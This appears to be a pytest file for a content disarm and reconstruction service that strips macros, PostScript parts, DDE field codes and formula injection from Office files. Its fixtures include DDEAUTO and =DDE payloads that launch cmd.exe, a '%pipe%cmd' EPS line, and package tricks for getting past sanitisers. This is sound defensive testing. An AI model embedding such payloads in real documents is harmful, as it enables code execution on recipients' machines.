        exif_src = _make_image_with_exif(fmt)
        assert b"Camera" in exif_src, "fixture is defective — no EXIF in the input"
        _, exif_report = cdr.cdr_image(exif_src, ext)
        assert "EXIF" in exif_report["removed"], \
            "CDR did not report EXIF removal on an image that carried EXIF"


class TestContentTypesSanitisation:

    def _make_macro_content_types(self) -> bytes:
        return (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>'
            '<Override PartName="/xl/workbook.xml"'
            ' ContentType="application/vnd.ms-excel.sheet.macroEnabled.12"/>'
            '</Types>'
        ).encode()

    def test_macro_content_type_replaced(self):
        data = self._make_macro_content_types()
        clean, removed = cdr._sanitise_content_types(data)

        assert b"macroEnabled" not in clean, "macro-enabled content type still present"
        assert b"spreadsheetml.sheet" in clean, "clean content type not written"
        assert len(removed) > 0

    def test_vba_bin_default_removed(self):
        data = self._make_macro_content_types()
        clean, removed = cdr._sanitise_content_types(data)

        assert b"vbaProject" not in clean, "vbaProject reference still in content types"

    def test_clean_content_types_unchanged(self):
        clean_data = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Override PartName="/word/document.xml"'
            ' ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document"/>'
            '</Types>'
        ).encode()
        result, removed = cdr._sanitise_content_types(clean_data)
        assert removed == []


class TestPostScriptStrip:
    """PostScript/EPS is a Turing-complete interpreter language and a historic RCE
    surface. Both the [Content_Types].xml declaration and the part bytes must be dropped."""

    def test_postscript_default_entry_removed(self):
        data = (
            '<?xml version="1.0"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="eps" ContentType="application/postscript"/>'
            '</Types>'
        ).encode()
        clean, removed = cdr._sanitise_content_types(data)
        assert b"postscript" not in clean.lower(), "PostScript Default entry survived"
        assert any("postscript" in r.lower() for r in removed)

    def test_postscript_override_entry_removed(self):
        data = (
            '<?xml version="1.0"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Override PartName="/word/media/image1.eps" ContentType="image/x-eps"/>'
            '</Types>'
        ).encode()
        clean, removed = cdr._sanitise_content_types(data)
        assert b"x-eps" not in clean.lower(), "PostScript Override entry survived"
        assert len(removed) == 1

    def test_clean_content_types_with_no_postscript_unchanged(self):
        data = (
            '<?xml version="1.0"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="png" ContentType="image/png"/>'
            '</Types>'
        ).encode()
        _, removed = cdr._sanitise_content_types(data)
        assert removed == []

    def test_eps_part_bytes_dropped_by_cdr_office(self):
        """End-to-end: an .eps part in <app>/media/ is removed from the rebuilt archive."""
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml",
                       '<?xml version="1.0"?>'
                       '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                       '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
                       '<Default Extension="eps" ContentType="application/postscript"/>'
                       '</Types>')
            z.writestr("_rels/.rels", _minimal_rels())
            z.writestr("word/media/image1.eps",
                       b"%!PS-Adobe-3.0 EPSF-3.0\n(%pipe%cmd) (w) file\n")
            z.writestr("word/document.xml",
                       '<w:document xmlns:w="http://schemas.openxmlformats.org/'
                       'wordprocessingml/2006/main"><w:body/></w:document>')
        clean, report = cdr.cdr_office(buf.getvalue(), "docx")

        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            names = z.namelist()
            content_types = z.read("[Content_Types].xml")
        assert "word/media/image1.eps" not in names, "EPS part bytes survived CDR"
        assert b"postscript" not in content_types.lower(), "PostScript declaration survived"

    @staticmethod
    def _docx_with_ps_override(content_type: str, part_name: str) -> bytes:
        """A .docx declaring `part_name` as PostScript via an Override, with the payload
        stored under that (arbitrary) name — the extension need not be .eps."""
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml",
                       '<?xml version="1.0"?>'
                       '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                       '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
                       f'<Override PartName="/{part_name}" ContentType="{content_type}"/>'
                       '</Types>')
            z.writestr("_rels/.rels", _minimal_rels())
            z.writestr(part_name, b"%!PS-Adobe-3.0 EPSF-3.0 evil payload")
            z.writestr("word/document.xml",
                       '<w:document xmlns:w="http://schemas.openxmlformats.org/'
                       'wordprocessingml/2006/main"><w:body/></w:document>')
        return buf.getvalue()

    def test_override_postscript_on_nonexps_partname_stripped(self):
        """BYPASS REGRESSION: an Override binding a non-.eps part (e.g. image1.png) to
        application/postscript must still drop the part bytes — the suffix rule alone
        misses this; the content-type pre-pass must catch it."""
        data = self._docx_with_ps_override("application/postscript", "word/media/image1.png")
        clean, _ = cdr.cdr_office(data, "docx")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            names = z.namelist()
            content_types = z.read("[Content_Types].xml")
        assert "word/media/image1.png" not in names, "PostScript payload survived via Override"
        assert b"postscript" not in content_types.lower()

    def test_override_postscript_no_extension_stripped(self):
        data = self._docx_with_ps_override("application/postscript", "word/media/blob")
        clean, _ = cdr.cdr_office(data, "docx")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            assert "word/media/blob" not in z.namelist()

    def test_evasive_content_type_with_parameter_stripped(self):
        """BYPASS REGRESSION: a parameterised/whitespaced content type
        (`application/postscript; charset=utf-8`) must not evade detection."""
        data = self._docx_with_ps_override(
            "application/postscript; charset=utf-8", "word/media/pic.png")
        clean, removed = cdr.cdr_office(data, "docx")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            names = z.namelist()
            content_types = z.read("[Content_Types].xml")
        assert "word/media/pic.png" not in names, "evasive-CT PostScript payload survived"
        assert b"postscript" not in content_types.lower()

    def test_is_postscript_ct_normalisation(self):
        assert cdr._is_postscript_ct("application/postscript")
        assert cdr._is_postscript_ct("APPLICATION/POSTSCRIPT")
        assert cdr._is_postscript_ct("  application/postscript  ")
        assert cdr._is_postscript_ct("application/postscript;charset=utf-8")
        assert cdr._is_postscript_ct("image/x-eps")
        assert not cdr._is_postscript_ct("image/png")
        assert not cdr._is_postscript_ct("application/vnd.ms-postscript-lookalike")


class TestXmlPartResolvedViaContentType:
    """The XML macro scrub dispatched on `name.endswith(".xml")`, but OPC binds a content
    type to an exact PartName irrespective of filename — the same authority mistake as
    pitfall #49, one layer over. A document part stored as `word/document.bin` and declared
    wordprocessingml via an Override was read as XML by every real consumer while CDR
    skipped it entirely, reporting `removed: []` on a file carrying a live DDEAUTO payload.
    Confirmed with an independent parser: python-docx opened the *sanitised* output and
    still saw the payload (pitfall #54)."""

    NS_MAIN = ("application/vnd.openxmlformats-officedocument"
               ".wordprocessingml.document.main+xml")
    PAYLOAD = ('<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org'
               '/wordprocessingml/2006/main"><w:body><w:p><w:r><w:instrText>'
               'DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/c calc.exe"'
               '</w:instrText></w:r></w:p></w:body></w:document>')

    def _package(self, part_name, content_type):
        content_types = (
            '<?xml version="1.0"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package'
            '.relationships+xml"/>'
            f'<Override PartName="/{part_name}" ContentType="{content_type}"/>'
            '</Types>'
        )
        root_rels = (
            '<?xml version="1.0"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/'
            'relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats'
            f'.org/officeDocument/2006/relationships/officeDocument" Target="{part_name}"/>'
            '</Relationships>'
        )
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", content_types)
            z.writestr("_rels/.rels", root_rels)
            z.writestr(part_name, self.PAYLOAD)
        return buf.getvalue()

    @pytest.mark.parametrize("part_name", [
        "word/document.xml",   # control: suffix alone would have caught this
        "word/document.bin",   # the bypass: no .xml suffix, Override declares it XML
        "word/document",       # no suffix at all
    ])
    def test_override_declared_xml_part_is_scrubbed(self, part_name):
        raw = self._package(part_name, self.NS_MAIN)
        assert b"cmd.exe" in raw  # precondition: payload really is in the input
        clean, report = cdr.cdr_office(raw, "docx")
        assert b"cmd.exe" not in clean, \
            f"{part_name}: field-code payload survived the XML macro scrub"
        assert any("field code" in r for r in report["removed"]), \
            f"{part_name}: scrubbed but not reported"

    def test_plain_application_xml_override_is_scrubbed(self):
        # The +xml suffix convention is not the only spelling a package may use.
        raw = self._package("word/part0", "application/xml")
        clean, _ = cdr.cdr_office(raw, "docx")
        assert b"cmd.exe" not in clean

    def test_binary_part_misdeclared_as_xml_is_preserved(self):
        # False-positive guard: a part declared XML whose bytes are binary must not break
        # the rebuild. _strip_xml_macros leaves unparseable content alone, so the entry
        # survives byte-for-byte rather than being mangled or rejected.
        blob = bytes(range(256)) * 8
        content_types = (
            '<?xml version="1.0"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package'
            '.relationships+xml"/>'
            '<Override PartName="/word/media/image1.png" ContentType="application/xml"/>'
            '</Types>'
        )
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", content_types)
            z.writestr("word/media/image1.png", blob)
        clean, _ = cdr.cdr_office(buf.getvalue(), "docx")
        with zipfile.ZipFile(io.BytesIO(clean)) as out:
            assert out.read("word/media/image1.png") == blob

    def test_xml_override_parts_ignores_non_xml_types(self):
        content_types = (
            '<?xml version="1.0"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Override PartName="/word/media/i.png" ContentType="image/png"/>'
            '<Override PartName="/word/doc.bin" ContentType="text/xml"/>'
            '</Types>'
        ).encode()
        assert cdr._xml_override_parts(content_types) == {"word/doc.bin"}


class TestDefaultExtensionDeclaration:
    """OPC declares content types through **two** mechanisms, and both are authoritative:
    `Override` binds one exact PartName, `Default` binds every part with a given extension.
    Pitfall #54 closed the Override half and left the Default half open — a package needs no
    Override at all to bind a document part, just
    `<Default Extension="dat" ContentType="…wordprocessingml.document.main+xml"/>` plus an
    officeDocument relationship pointing at `word/doc.dat`. python-docx opened the sanitised
    output and still saw a live DDEAUTO payload (pitfall #55)."""

    NS_MAIN = ("application/vnd.openxmlformats-officedocument"
               ".wordprocessingml.document.main+xml")
    PAYLOAD = ('<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org'
               '/wordprocessingml/2006/main"><w:body><w:p><w:r><w:instrText>'
               'DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/c calc.exe"'
               '</w:instrText></w:r></w:p></w:body></w:document>')

    def _package(self, part_name, declaration, rel_target=None, body=None):
        content_types = (
            '<?xml version="1.0"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package'
            '.relationships+xml"/>'
            f'{declaration}</Types>'
        )
        root_rels = (
            '<?xml version="1.0"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/'
            'relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats'
            '.org/officeDocument/2006/relationships/officeDocument" '
            f'Target="{rel_target or part_name}"/></Relationships>'
        )
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", content_types)
            z.writestr("_rels/.rels", root_rels)
            z.writestr(part_name, self.PAYLOAD if body is None else body)
        return buf.getvalue()

    @pytest.mark.parametrize("part_name,ext", [
        ("word/doc.dat", "dat"),
        ("word/doc.bin", "bin"),
    ])
    def test_default_declared_xml_part_is_scrubbed(self, part_name, ext):
        raw = self._package(
            part_name, f'<Default Extension="{ext}" ContentType="{self.NS_MAIN}"/>')
        assert b"cmd.exe" in raw
        clean, report = cdr.cdr_office(raw, "docx")
        assert b"cmd.exe" not in clean, \
            f"{part_name}: Default-declared XML part skipped the macro scrub"
        assert any("field code" in r for r in report["removed"])

    @pytest.mark.parametrize("target", [
        "/word/doc.dat",          # absolute form
        "word/./doc.dat",         # dot segment
        "word/sub/../doc.dat",    # dotdot segment
    ])
    def test_default_declared_part_scrubbed_whatever_the_rel_spelling(self, target):
        # The declaration binds by extension, so the rel Target spelling cannot matter —
        # every one of these resolves to the same part for a real consumer.
        raw = self._package(
            "word/doc.dat", f'<Default Extension="dat" ContentType="{self.NS_MAIN}"/>',
            rel_target=target)
        clean, _ = cdr.cdr_office(raw, "docx")
        assert b"cmd.exe" not in clean

    def test_sanitised_output_is_clean_to_an_independent_parser(self):
        # A byte check only proves the bytes changed; this proves the consumer that would
        # execute the payload no longer sees it.
        docx = pytest.importorskip("docx")
        raw = self._package(
            "word/doc.dat", f'<Default Extension="dat" ContentType="{self.NS_MAIN}"/>')
        assert "DDEAUTO" in docx.Document(io.BytesIO(raw)).element.xml
        clean, _ = cdr.cdr_office(raw, "docx")
        assert "cmd.exe" not in docx.Document(io.BytesIO(clean)).element.xml

    def test_default_declared_postscript_part_is_dropped(self):
        # Same two-mechanism argument on the EPS part-strip half.
        eps = b"%!PS-Adobe-3.0 EPSF-3.0\n(payload) show\nshowpage\n"
        raw = self._package(
            "word/media/logo.img",
            '<Default Extension="img" ContentType="application/postscript"/>'
            f'<Override PartName="/word/document.xml" ContentType="{self.NS_MAIN}"/>',
            rel_target="word/document.xml", body=eps)
        buf = io.BytesIO(raw)
        with zipfile.ZipFile(buf, "a") as z:
            z.writestr("word/document.xml", "<w:document/>")
        clean, report = cdr.cdr_office(buf.getvalue(), "docx")
        with zipfile.ZipFile(io.BytesIO(clean)) as out:
            assert "word/media/logo.img" not in out.namelist()

    def test_default_extension_xml_does_not_widen_to_unrelated_parts(self):
        # False-positive guard: real packages carry <Default Extension="xml"…>, which must
        # bind only parts that actually end .xml — a .png must not be pulled into the scrub
        # set by an unrelated Default.
        content_types = (
            '<?xml version="1.0"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '</Types>'
        ).encode()
        resolved = cdr._xml_override_parts(
            content_types, ["word/document.xml", "word/media/image1.png"])
        assert "word/media/image1.png" not in resolved
        assert "word/document.xml" in resolved

    def test_declared_parts_empty_without_entry_names(self):
        # Default binds by extension, so it can only be resolved against real entries.
        content_types = (
            '<?xml version="1.0"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="dat" ContentType="application/xml"/>'
            '</Types>'
        ).encode()
        assert cdr._xml_override_parts(content_types) == set()
        assert cdr._xml_override_parts(content_types, ["word/doc.dat"]) == {"word/doc.dat"}

    @pytest.mark.parametrize("suffix", ["; charset=utf-8", ";charset=utf-8", " ;charset=UTF-8"])
    def test_content_type_mime_parameter_still_classified_xml(self, suffix):
        """A `;` parameter must not move `+xml` off the end of the string.

        `_is_xml_ct` tested `endswith("+xml")` after `.strip()`, which handles trailing
        whitespace but not a trailing MIME parameter — so `…main+xml; charset=utf-8`
        classified as non-XML and the part was never scrubbed. This is hardening, not a
        live-bypass fix: OPC declares a bare media type, so the parameterised form is
        malformed and both LibreOffice and python-docx refuse the package (pitfall #58).
        Pinned so the classifier cannot silently narrow again."""
        assert cdr._is_xml_ct(self.NS_MAIN + suffix), \
            "MIME parameter defeated the +xml suffix test"
        content_types = (
            '<?xml version="1.0"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            f'<Override PartName="/word/doc.dat" ContentType="{self.NS_MAIN}{suffix}"/>'
            '</Types>'
        ).encode()
        assert cdr._xml_override_parts(content_types, ["word/doc.dat"]) == {"word/doc.dat"}

    def test_mime_parameter_does_not_widen_to_non_xml_types(self):
        """False-positive guard: stripping the parameter must not turn a non-XML type XML.

        Without this, `split(";")` could be mistaken for a general permissiveness fix; the
        parameter is discarded, but the media type itself is still required to be XML."""
        assert not cdr._is_xml_ct("application/octet-stream; charset=utf-8")
        assert not cdr._is_xml_ct("image/png;charset=utf-8")
        assert not cdr._is_xml_ct("application/xml-dtd")
        content_types = (
            '<?xml version="1.0"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Override PartName="/word/doc.dat" '
            'ContentType="application/octet-stream; charset=utf-8"/>'
            '</Types>'
        ).encode()
        assert cdr._xml_override_parts(content_types, ["word/doc.dat"]) == set()


class TestContentTypeRealOfficeTypes:
    """Validate MACRO_CONTENT_TYPE_REMAP against the actual content type strings
    that Microsoft Office writes into [Content_Types].xml for every macro-enabled format.
    Uses both Override (part-level *.main+xml) and Default (.12 container) entry forms."""

    def _ct_xml_override(self, content_type: str) -> bytes:
        return (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            f'<Override PartName="/word/document.xml" ContentType="{content_type}"/>'
            '</Types>'
        ).encode()

    def _ct_xml_default(self, content_type: str) -> bytes:
        return (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            f'<Default Extension="ext" ContentType="{content_type}"/>'
            '</Types>'
        ).encode()

    def _assert_remapped(self, input_ct: str, expected_ct: str, entry_type: str):
        xml = self._ct_xml_override(input_ct) if entry_type == "override" else self._ct_xml_default(input_ct)
        clean, removed = cdr._sanitise_content_types(xml)
        clean_str = clean.decode()
        assert input_ct not in clean_str, f"{input_ct!r} was NOT replaced"
        assert expected_ct in clean_str, f"expected {expected_ct!r} not found after remap"

    # ── Part-level Override types (*.main+xml) — what real Office files write ──

    def test_docm_part_level_type_remapped(self):
        self._assert_remapped(
            "application/vnd.ms-word.document.macroEnabled.main+xml",
            "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml",
            "override")

    def test_dotm_part_level_type_remapped(self):
        self._assert_remapped(
            "application/vnd.ms-word.template.macroEnabledTemplate.main+xml",
            "application/vnd.openxmlformats-officedocument.wordprocessingml.template.main+xml",
            "override")

    def test_xlsm_part_level_type_remapped(self):
        self._assert_remapped(
            "application/vnd.ms-excel.sheet.macroEnabled.main+xml",
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml",
            "override")

    def test_xltm_part_level_type_remapped(self):
        self._assert_remapped(
            "application/vnd.ms-excel.template.macroEnabled.main+xml",
            "application/vnd.openxmlformats-officedocument.spreadsheetml.template.main+xml",
            "override")

    def test_pptm_part_level_type_remapped(self):
        self._assert_remapped(
            "application/vnd.ms-powerpoint.presentation.macroEnabled.main+xml",
            "application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml",
            "override")

    def test_potm_part_level_type_remapped(self):
        self._assert_remapped(
            "application/vnd.ms-powerpoint.template.macroEnabled.main+xml",
            "application/vnd.openxmlformats-officedocument.presentationml.template.main+xml",
            "override")

    def test_ppsm_part_level_type_remapped(self):
        self._assert_remapped(
            "application/vnd.ms-powerpoint.slideshow.macroEnabled.main+xml",
            "application/vnd.openxmlformats-officedocument.presentationml.slideshow.main+xml",
            "override")

    # ── Container-level Default types (.12) — older Office files and add-ins ──

    def test_docm_container_type_remapped_as_default(self):
        self._assert_remapped(
            "application/vnd.ms-word.document.macroEnabled.12",
            "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            "default")

    def test_dotm_container_type_remapped_as_default(self):
        self._assert_remapped(
            "application/vnd.ms-word.template.macroEnabled.12",
            "application/vnd.openxmlformats-officedocument.wordprocessingml.template",
            "default")

    def test_xlsm_container_type_remapped_as_default(self):
        self._assert_remapped(
            "application/vnd.ms-excel.sheet.macroEnabled.12",
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            "default")

    def test_xlam_container_type_remapped_as_default(self):
        self._assert_remapped(
            "application/vnd.ms-excel.addin.macroEnabled.12",
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            "default")

    def test_xlsb_container_type_remapped_as_default(self):
        self._assert_remapped(
            "application/vnd.ms-excel.sheet.binary.macroEnabled.12",
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            "default")

    def test_pptm_container_type_remapped_as_default(self):
        self._assert_remapped(
            "application/vnd.ms-powerpoint.presentation.macroEnabled.12",
            "application/vnd.openxmlformats-officedocument.presentationml.presentation",
            "default")

    def test_ppam_container_type_remapped_as_default(self):
        self._assert_remapped(
            "application/vnd.ms-powerpoint.addin.macroEnabled.12",
            "application/vnd.openxmlformats-officedocument.presentationml.presentation",
            "default")


class TestXlsbCDR:
    """xlsb files with sheet binaries are converted to clean xlsx via cdr_xlsb().
    Cell values are preserved; all formulas, DDE, VBA, and active content are stripped."""

    def test_xlsb_with_sheet_produces_xlsx(self):
        """cdr_xlsb() returns valid xlsx bytes."""
        clean, report = cdr.cdr_xlsb(_make_xlsb())
        wb = openpyxl.load_workbook(io.BytesIO(clean))
        assert len(wb.sheetnames) == 1

    def test_xlsb_cell_values_preserved(self):
        """Cell values survive the xlsb→xlsx conversion."""
        clean, report = cdr.cdr_xlsb(_make_xlsb(rows=[[10.0, 20.0], [30.0, 40.0]]))
        wb = openpyxl.load_workbook(io.BytesIO(clean))
        ws = wb.active
        assert ws.cell(1, 1).value == pytest.approx(10.0)
        assert ws.cell(1, 2).value == pytest.approx(20.0)
        assert ws.cell(2, 1).value == pytest.approx(30.0)
        assert ws.cell(2, 2).value == pytest.approx(40.0)

    def test_xlsb_report_records_conversion(self):
        """Report indicates BIFF12 binary content was converted."""
        _, report = cdr.cdr_xlsb(_make_xlsb())
        assert report["format"] == "xlsb"
        assert report["converted_to"] == "xlsx"
        assert report["cdr_mode"] == "full"
        assert len(report["removed"]) > 0

    def test_cdr_office_dispatches_to_cdr_xlsb_on_sheet_bin(self):
        """cdr_office() calls cdr_xlsb() when a sheet .bin is encountered — no ValueError."""
        clean, report = cdr.cdr_office(_make_xlsb(), "xlsb")
        # Must be valid xlsx (openpyxl can open it)
        wb = openpyxl.load_workbook(io.BytesIO(clean))
        assert len(wb.sheetnames) >= 1
        assert report["converted_to"] == "xlsx"

    def test_xlsb_vba_only_still_handled_by_zip_path(self):
        """xlsb with VBA but no sheet .bin still goes through normal ZIP CDR."""
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", _minimal_content_types())
            z.writestr("_rels/.rels", _minimal_rels())
            z.writestr("xl/vbaProject.bin", b"\xd0\xcf\x11\xe0MACRO_BINARY")
        clean, report = cdr.cdr_office(buf.getvalue(), "xlsb")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            names = [n.lower() for n in z.namelist()]
        assert not any("vbaproject.bin" in n for n in names)
        assert report.get("converted_to") is None  # went through ZIP path, not cdr_xlsb

    def test_xlsb_metadata_bin_not_diverted_to_conversion(self):
        """An xlsb with non-worksheet .bin parts (e.g. xl/workbook.bin) but no
        xl/worksheets/sheet*.bin must NOT be handed to cdr_xlsb() — only worksheet
        binaries trigger conversion. It goes through the normal ZIP CDR path."""
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", _minimal_content_types())
            z.writestr("_rels/.rels", _minimal_rels())
            z.writestr("xl/workbook.bin", b"\x00\x01metadata-not-a-worksheet")
            z.writestr("xl/vbaProject.bin", b"\xd0\xcf\x11\xe0MACRO_BINARY")
        clean, report = cdr.cdr_office(buf.getvalue(), "xlsb")
        assert report.get("converted_to") is None  # ZIP path, not cdr_xlsb
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            names = [n.lower() for n in z.namelist()]
        assert not any("vbaproject.bin" in n for n in names)  # VBA still stripped

    def test_xlsb_formula_string_cached_value_forced_to_plain_text(self):
        """A FORMULA_STRING cached result starting with '=' must NOT become a live
        formula in the output xlsx. cdr_xlsb() prefixes it with an apostrophe so
        openpyxl serialises it as a plain string, not a <f> element."""
        # Build an xlsb with a string cell value that starts with '=' (simulating a
        # crafted FORMULA_STRING cached result like '=DDE("cmd","/c calc")').
        # We patch pyxlsb so we can inject the problematic cached value directly,
        # without needing to encode a real FORMULA_STRING BIFF12 record.
        from unittest.mock import MagicMock, patch

        evil_value = '=DDE("cmd","/c calc")'

        # Create a fake cell namedtuple that matches pyxlsb's Cell structure
        import collections
        FakeCell = collections.namedtuple("FakeCell", ["r", "c", "v"])
        fake_row = [FakeCell(r=0, c=0, v=evil_value)]

        fake_ws = MagicMock()
        fake_ws.__enter__ = lambda s: s
        fake_ws.__exit__ = MagicMock(return_value=False)
        fake_ws.rows.return_value = [fake_row]

        fake_wb = MagicMock()
        fake_wb.__enter__ = lambda s: s
        fake_wb.__exit__ = MagicMock(return_value=False)
        fake_wb.sheets = ["Sheet1"]
        fake_wb.get_sheet.return_value = fake_ws

        with patch("pyxlsb.open_workbook", return_value=fake_wb):
            clean, _ = cdr.cdr_xlsb(_make_xlsb())

        wb = openpyxl.load_workbook(io.BytesIO(clean))
        ws = wb.active
        cell = ws.cell(1, 1)
        # The cell must NOT be a formula type and must NOT contain the raw DDE string
        assert cell.data_type != "f", "cell was serialised as a formula — formula injection not blocked"
        assert cell.value != evil_value, "raw evil_value survived unsanitised"
        # The apostrophe prefix makes the value a plain text string in Excel
        assert cell.value == "'" + evil_value


class TestZipValidation:

    def _make_zip(self, entries: dict,
                  compress_method: int = zipfile.ZIP_DEFLATED) -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", compression=compress_method) as z:
            for name, data in entries.items():
                z.writestr(name, data)
        return buf.getvalue()

    def test_valid_zip_returns_true_no_anomalies(self):
        data = self._make_zip({
            "[Content_Types].xml": b"<Types/>",
            "word/document.xml": b"<doc/>",
        })
        valid, anomalies = cdr._validate_zip_structure(data)
        assert valid is True
        assert anomalies == []

    def test_zip_without_content_types_rejected(self):
        """A valid ZIP that is not an OOXML package (no [Content_Types].xml) must be
        hard-rejected, not CDR'd and labelled sanitised."""
        data = self._make_zip({"random/file.txt": b"x", "another.bin": b"y"})
        valid, anomalies = cdr._validate_zip_structure(data)
        assert valid is False
        assert "Content_Types" in anomalies[0]

    def test_wrong_magic_bytes_returns_false(self):
        data = b"Not a ZIP file at all"
        valid, anomalies = cdr._validate_zip_structure(data)
        assert valid is False

    def test_too_small_returns_false(self):
        valid, anomalies = cdr._validate_zip_structure(b"\x50\x4b")
        assert valid is False

    def test_duplicate_entry_names_hard_rejected(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("word/document.xml", b"<doc/>")
            z.writestr("word/document.xml", b"<evil/>")
        data = buf.getvalue()
        valid, anomalies = cdr._validate_zip_structure(data)
        assert valid is False  # hard reject — reader disambiguation is app-defined
        assert any("duplicate" in a.lower() for a in anomalies)

    def test_non_zip_magic_detected(self):
        data = b"%PDF-1.4 fake content" + b"\x00" * 100
        valid, anomalies = cdr._validate_zip_structure(data)
        assert valid is False


# ── Handler integration tests (mocked S3 / SNS) ────────────────────────────────

class TestHandler:

    def _event(self, bucket: str, key: str, size: int = 1024) -> dict:
        return {
            "detail": {
                "bucket": {"name": bucket},
                "object": {"key": key, "size": size},
            }
        }

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    @patch.object(cdr, "_download")
    def test_handler_docx(self, mock_dl, mock_ul, mock_pub, mock_s3):
        mock_dl.return_value = (_make_docx_with_macro(), "application/vnd.openxmlformats-officedocument.wordprocessingml.document")
        mock_s3.delete_object.return_value = {}

        result = cdr.handler(self._event("src-bucket", "uploads/report.docx"), None)

        assert result["status"] == "sanitised"
        assert "report.docx" in result["destination"]
        mock_ul.assert_called_once()
        mock_pub.assert_called_once()
        mock_s3.delete_object.assert_called_once_with(Bucket="src-bucket", Key="uploads/report.docx")

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    @patch.object(cdr, "_download")
    def test_handler_pdf(self, mock_dl, mock_ul, mock_pub, mock_s3):
        mock_dl.return_value = (_make_pdf_with_js(), "application/pdf")
        mock_s3.delete_object.return_value = {}

        result = cdr.handler(self._event("src-bucket", "docs/invoice.pdf"), None)

        assert result["status"] == "sanitised"
        assert len(result["report"]["report"]["removed"]) > 0
        mock_s3.delete_object.assert_called_once_with(Bucket="src-bucket", Key="docs/invoice.pdf")

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    @patch.object(cdr, "_download")
    def test_handler_unsupported_ext_fails_closed(self, mock_dl, mock_ul, mock_pub, mock_s3):
        """An unrecognised extension must FAIL CLOSED: quarantined as unsupported-format,
        never uploaded to SANITISED_BUCKET with a 'sanitised' label. Source is deleted."""
        mock_dl.return_value = (b"raw binary data", "application/octet-stream")
        mock_s3.delete_object.return_value = {}

        result = cdr.handler(self._event("src-bucket", "archive.tar.gz"), None)

        assert result["status"] == "unsupported-format"
        # The only _upload call must target the quarantine bucket, NOT the sanitised one.
        assert mock_ul.call_count == 1
        upload_bucket = mock_ul.call_args[0][0]
        assert upload_bucket == cdr.QUARANTINE_BUCKET
